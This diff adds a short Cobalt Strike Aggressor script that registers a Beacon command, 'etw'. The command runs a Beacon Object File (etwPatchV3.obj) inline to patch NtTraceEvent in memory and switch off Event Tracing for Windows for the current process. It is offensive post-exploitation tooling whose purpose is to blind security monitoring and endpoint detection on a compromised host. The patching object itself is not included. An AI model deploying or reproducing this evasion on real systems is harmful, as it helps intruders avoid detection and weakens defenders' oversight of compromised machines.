@@ -1,0 +1,10 @@
+#register help
+beacon_command_register("etw", "Patch ETW for current process",
+	"Synopsis: etw \n\n" .
+	"Use memory patching technique on NtTraceEvent function to disable ETW");
+
+#setting the alias
+alias etw {
+	binput($1,"Patching ETW...");
+	binline_execute($1,"etwPatchV3.obj");
+}
